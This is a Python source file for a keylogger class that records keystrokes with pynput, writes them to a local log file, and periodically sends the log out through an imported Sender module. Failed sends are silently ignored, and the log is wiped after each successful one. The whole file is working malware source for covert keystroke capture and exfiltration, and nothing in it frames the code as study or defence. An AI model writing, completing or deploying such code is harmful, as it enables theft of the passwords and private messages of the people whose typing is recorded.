from pynput.keyboard import Key
from Sender import Sender

class Logger:
    counter = 0
    send_counter = 0
    chars = []
    chars_limit = 15
    send_limit = 20
    sender = Sender()

    def __init__(self):
        with open("log.txt","r",encoding="utf-8") as f:
            data = f.read()
            if len(data) > 0:
                self.send()    

    def on_press(self,key):
        self.chars.append(key)
        self.counter += 1
        self.send_counter += 1
        
        if self.counter >= self.chars_limit:
            self.write_to_file()

        if self.send_counter >= self.send_limit:
            self.send()

    def send(self):
        data = ""
        with open("log.txt","r",encoding="utf-8") as f:
            data = f.read()
        
        try:
            self.sender.send_data(data)
        except:
            pass
        else:
            with open("log.txt","w",encoding="utf-8") as f:
                f.write("")
        self.send_counter = 0

    def write_to_file(self):
        content = ""
        with open("log.txt","a+",encoding="utf-8") as f:
            content = f.read()
            for key in self.chars:
                k = str(key).replace("'","")

                if k.find("Key.space") >= 0:
                    content += " "

                elif k.find("Key.backspace") >= 0:
                    content = content[0:-1]

                elif k.find("Key.enter") >= 0:
                    content += '\n'

                elif k.find("Key") == -1:
                    content += k    
            
            #print(content)
            f.write(content)
        
        self.chars = []
        self.counter = 0

    def on_release(self,key):
        if key == Key.esc:
            self.write_to_file()
            self.send()
            return False